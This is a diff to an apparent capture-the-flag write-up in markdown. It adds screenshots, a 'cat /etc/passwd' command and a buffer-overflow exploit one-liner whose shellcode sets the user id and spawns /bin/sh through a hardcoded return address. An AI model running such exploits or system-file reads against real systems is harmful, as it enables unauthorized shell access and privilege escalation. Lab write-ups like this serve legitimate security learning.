@@ -104,6 +104,29 @@ It´s part of my $$\textcolor{#FF69B4}{\textbf{213}}$$-day-streak in  <a href="h
 
 <br>
 
+![image](https://github.com/user-attachments/assets/42493d57-698c-47b3-b5f8-92ef756c91b1)
+
+<br>
+
+<p>we need to access it with <code>user 2</code>.</p>
+
+![image](https://github.com/user-attachments/assets/cf5f11a8-d185-41db-9c31-fcbfb2e99c7a)
+
+<pre><code>cat /etc/passwd</code></pre>
+
+![image](https://github.com/user-attachments/assets/15f2599d-eaa3-4fa4-bce2-c21de1cde749)
+
+<br>
+
+<pre><code>./buffer-overflow $(python -c "print '\x90'*86+'\x31\xff\x66\xbf\xea\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05' + 'A'*12 + '\x98\xe2\xff\xff\xff\x7f'")</code></pre>
+
+
+
+<br>
+
+
+
+
 
 
 
